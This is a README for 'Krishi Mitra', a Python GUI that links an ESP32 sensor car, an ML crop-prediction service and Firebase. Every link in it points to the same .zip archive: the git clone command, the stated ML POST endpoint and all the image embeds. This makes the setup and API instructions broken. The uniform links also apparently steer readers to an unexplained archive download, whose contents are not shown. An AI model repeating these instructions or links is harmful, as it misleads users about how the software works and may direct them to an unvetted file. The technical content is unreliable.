# Krishi Mitra - Python GUI Based IoT Agro Car

## Overview
Krishi Mitra is a Python-based GUI application that acts as an interface between ESP32, a Machine Learning (ML) model, and Firebase for real-time agricultural data storage and analysis. The GUI provides user authentication, real-time sensor data display, ML-based crop prediction, and data visualization to help farmers make informed decisions.

## Features

### Dashboard (Python GUI)
- Real-time sensor data from ESP32
- Crop prediction based on ML model response
- Graphical data visualization for farmers

### Data Flow
1. ESP32 sends real-time data to the Python GUI via serial communication.
2. The GUI forwards this data to an ML model endpoint.
3. The ML model responds with crop predictions.
4. The GUI displays predictions and sensor data to the user.
5. Data is stored in Firebase for historical analysis.

## Tech Stack
### Hardware
- ESP32
- Soil Moisture Sensor
- DHT11 (Temperature and Humidity Sensor)
- Power Supply (Battery/Adapter)
- FS-i10B (For controlling the IoT car)

### Software
- **Python GUI:** Tkinter / PyQt / Kivy
- **Database:** Firebase (NoSQL database for real-time storage)
- **ML Integration:** API calls to an external ML model

### Communication Protocols
- **ESP32 to Python GUI:** Serial Communication (UART)
- **Python GUI to ML Model:** HTTP API calls
- **Python GUI to Firebase:** Realtime Database API

## Installation and Setup
### 1. Clone the Repository
```sh
git clone https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip
cd Krishi_Mitra
```

### 2. Install Dependencies
```sh
pip install tkinter pyserial requests firebase-admin matplotlib
```

### 3. Connect ESP32 and Run the GUI
```sh
python main.py
```

## API Endpoints
### ESP32 Data Submission (Received in Python GUI via Serial)
**Format:**
```json
{
    "Temperature": 50.0,
    "Humidity": 20,
    "Soil type": "Clay loam",
    "Irrigation": "Spray",
    "Season": "Zaid"
}
```

### ML Model Prediction Request
**Endpoint:** `https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip`  
**Method:** POST  
**Payload:**
```json
{
    "Temperature": 50.0,
    "Humidity": 20,
    "Soil type": "Clay loam",
    "Irrigation": "Spray",
    "Season": "Zaid"
}
```

### ML Model Response Example
```json
{
    "All Probabilities": {
        "Arecanut": 0.44,
        "Blackgram": 0.0,
        "Cardamum": 0.24,
        "Cashew": 0.19,
        "Cocoa": 0.61,
        "Coconut": 39.12,
        "Coffee": 0.0,
        "Cotton": 0.0,
        "Ginger": 0.55,
        "Groundnut": 4.53,
        "Paddy": 17.98,
        "Pepper": 0.0,
        "Tea": 36.34
    },
    "Confidence (%)": 39.12,
    "Predicted Crop": "Coconut"
}
```

## Firebase Integration
- Stores real-time sensor data.
- Stores ML predictions.
- Enables historical analysis and visualization.

## System Architecture
1. **ESP32** → Sends data to → **Python GUI via Serial Communication**
2. **Python GUI** → Forwards data to → **ML Model**
3. **ML Model** → Sends predictions to → **Python GUI**
4. **Python GUI** → Displays predictions on → **Dashboard**
5. **Python GUI** → Stores data in → **Firebase**

## Future Enhancements
- Implement multi-language support for farmers.
- Add mobile app support.
- Optimize ML model accuracy.
- Improve GUI with additional graphing features.

## Contributors
- **Arka Mahajan** - Project Lead
- **Ishika Haldar** - Developer
- **Sayan Mukherjee** - Developer

## License
This project is licensed under the MIT License.

## Project Image
![WhatsApp Image 2025-03-08 at 16 29 14_c6d2534c](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
## ML Training 
![download (5)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
![download (6)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
![download (7)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
![download (8)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
![download (9)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
![download (10)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
![download (11)](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
## DASHBOARD
![image](https://raw.githubusercontent.com/arka-senpaii/Krishi_Mitra/main/ML/Krishi_Mitra_v2.1.zip)
